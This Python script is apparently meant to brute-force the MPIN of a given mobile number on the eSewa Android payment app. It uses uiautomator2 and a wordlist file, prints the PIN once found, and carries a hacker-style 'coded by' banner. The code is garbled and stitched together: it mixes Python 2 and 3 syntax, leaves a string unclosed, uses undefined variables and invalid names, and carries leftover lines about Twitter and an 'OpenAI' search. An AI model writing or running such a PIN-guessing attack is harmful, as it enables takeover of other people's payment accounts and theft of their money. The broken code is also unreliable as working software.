import uiautomator2 as u2

# connect the device
d = u2.connect()

# Launch the app (e.g., Twitter)
d.app_start("com.esewa.android")

# Wait for the app to load
d.wait_activity("com.esewa.android.app.main.MainActivity", timeout=20)

# Perform automated actions
# Example: Click on the login/register button
d(resourceId="com.esewa.android:id/toolbar_login/register").click()

# Wait for some time to allow for manual interaction
input("Perform manual actions and press Enter when ready...")
print('\n--v1.1.3------**[~~@V.CYPHER*~~]/coded by:VICKY**------v1.1.3--\n')
file=open('mpins.txt','r')

MobileNumber = input('Enter Mobile Number: ').strip()
print ("\nTarget Mobile Number : ",number)
print "\nTrying MPIN's from list ..."

i = 0
while file:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 4:
        continue
    print(str(i) + " : " + passw)
    response = open(d(resourceId="com.esewa.android:id/toolbar_login/register")).click()
	try:
		if response.code == 200:
			select_form(nr=0)
			.form['MobileNumber'] = mobilenumber
			.form['mpin'] = passw
			response =.submit()
			response_data = response.read()
			if 'response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your mpin is : ',passw)
				break
# Continue with automated actions
# Example: Enter a search query
Mobile Number_box = d(resourceId="com.esewa.android:id/toolbar_login/register_edittext")
search_box.set_text("OpenAI")

# Close the app
d.app_stop("com.esewa.android")